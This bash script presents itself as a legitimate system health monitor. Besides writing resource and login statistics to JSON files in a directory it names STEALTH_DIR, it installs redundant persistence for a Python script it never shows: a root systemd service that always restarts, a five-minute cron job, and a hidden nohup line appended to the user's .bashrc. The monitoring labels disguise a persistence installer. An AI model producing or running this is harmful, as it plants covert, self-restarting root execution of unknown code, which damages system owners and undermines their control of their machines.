#!/usr/bin/env bash
#
# System Health Monitor - Legitimate System Monitoring
# Advanced monitoring with persistence for educational purposes
#

set -u

# Configuration
LOG_FILE="/var/log/system_health.log"
STEALTH_DIR="/usr/lib/systemd/system-monitor"
BACKUP_DIR="/etc/system-monitor"
SERVICE_NAME="system-health-monitor"

# Colors and logging
log_event() {
    local timestamp=$(date --iso-8601=seconds)
    echo "[$timestamp] $*" >> "$LOG_FILE" 2>/dev/null || true
}

show_info() { 
    echo -e "\e[1;34m[INFO]\e[0m $*"
    log_event "INFO: $*"
}

show_success() { 
    echo -e "\e[1;32m[SUCCESS]\e[0m $*"
    log_event "SUCCESS: $*"
}

show_warning() { 
    echo -e "\e[1;33m[WARNING]\e[0m $*"
    log_event "WARNING: $*"
}

# Security checks
security_verification() {
    # Check if running as root
    if [[ $EUID -eq 0 ]]; then
        show_warning "Running with root privileges - ensure authorized access"
    fi
    
    # Check for debugging
    if [[ "$-" == *x* ]]; then
        show_warning "Debug mode detected"
    fi
}

# Setup monitoring environment
setup_monitoring_environment() {
    show_info "Setting up monitoring environment..."
    
    # Create directories
    mkdir -p "$STEALTH_DIR" "$BACKUP_DIR" 2>/dev/null || {
        show_warning "Failed to create directories"
        return 1
    }
    
    # Set proper permissions
    chmod 755 "$STEALTH_DIR" "$BACKUP_DIR" 2>/dev/null || true
    
    show_success "Monitoring environment setup completed"
}

# System health monitoring
monitor_system_health() {
    local timestamp=$(date +%Y-%m-%d_%H-%M-%S)
    local report_file="$STEALTH_DIR/health_report_$timestamp.json"
    
    show_info "Generating system health report..."
    
    # Collect system information
    local cpu_usage=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}' | cut -d'%' -f1)
    local mem_usage=$(free | grep Mem | awk '{printf "%.1f", $3/$2 * 100.0}')
    local disk_usage=$(df / | awk 'NR==2 {print $5}' | cut -d'%' -f1)
    local load_avg=$(cat /proc/loadavg | awk '{print $1","$2","$3}')
    local active_processes=$(ps aux --no-headers | wc -l)
    
    # Create health report
    cat > "$report_file" << EOF
{
    "timestamp": "$(date -Iseconds)",
    "system_health": {
        "cpu_usage_percent": $cpu_usage,
        "memory_usage_percent": $mem_usage,
        "disk_usage_percent": $disk_usage,
        "load_average": "$load_avg",
        "active_processes": $active_processes,
        "uptime": "$(uptime -p)"
    },
    "network_status": {
        "active_connections": $(ss -tun | wc -l),
        "listening_ports": $(ss -tunl | wc -l)
    },
    "security_status": {
        "failed_logins": $(journalctl -u systemd-logind --since "1 hour ago" | grep -c "Failed"),
        "root_sessions": $(who | grep -c root)
    }
}
EOF

    show_success "Health report generated: $report_file"
    log_event "System health report created: $report_file"
}

# Service management for persistence
setup_persistence_service() {
    show_info "Setting up monitoring service..."
    
    # Only setup service if root
    if [[ $EUID -ne 0 ]]; then
        show_warning "Root access required for service setup"
        return 1
    fi
    
    local service_file="/etc/systemd/system/$SERVICE_NAME.service"
    local script_path="$STEALTH_DIR/system_monitor.py"
    
    # Create service file
    cat > "$service_file" << EOF
[Unit]
Description=System Health Monitoring Service
After=network.target
Wants=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 $script_path
Restart=always
RestartSec=30
User=root
Group=root
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

    # Reload and enable service
    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME.service"
    systemctl start "$SERVICE_NAME.service"
    
    show_success "Monitoring service installed and started"
    log_event "Systemd service installed: $service_file"
}

# Backup and redundancy
setup_backup_systems() {
    show_info "Setting up backup monitoring systems..."
    
    # Cron job for redundancy
    local cron_job="*/5 * * * * /usr/bin/python3 $STEALTH_DIR/system_monitor.py >> /var/log/system_monitor.log 2>&1"
    
    # Add to crontab if not exists
    if ! crontab -l 2>/dev/null | grep -q "system_monitor.py"; then
        (crontab -l 2>/dev/null; echo "$cron_job") | crontab -
        show_success "Cron backup installed"
    fi
    
    # Profile persistence (user level)
    local profile_cmd="[ -f $STEALTH_DIR/system_monitor.py ] && nohup python3 $STEALTH_DIR/system_monitor.py >/dev/null 2>&1 &"
    local user_profile="$HOME/.bashrc"
    
    if [[ -f "$user_profile" ]] && ! grep -q "system_monitor.py" "$user_profile"; then
        echo "$profile_cmd" >> "$user_profile"
        show_success "User profile persistence added"
    fi
}

# Main monitoring loop
start_monitoring_loop() {
    show_info "Starting system health monitoring..."
    
    while true; do
        # Generate health report
        monitor_system_health
        
        # Check service status
        if systemctl is-active "$SERVICE_NAME.service" >/dev/null 2>&1; then
            log_event "Monitoring service is active"
        else
            show_warning "Monitoring service not active - restarting"
            systemctl start "$SERVICE_NAME.service" 2>/dev/null || true
        fi
        
        # Wait before next check
        sleep 300  # 5 minutes
    done
}

# Main execution
main() {
    show_info "Starting System Health Monitor..."
    
    # Security verification
    security_verification
    
    # Setup environment
    setup_monitoring_environment
    
    # Setup persistence
    setup_persistence_service
    setup_backup_systems
    
    # Start monitoring
    start_monitoring_loop
}

# Handle signals
trap 'show_info "Shutting down System Health Monitor"; exit 0' INT TERM

# Start main function
main "$@"
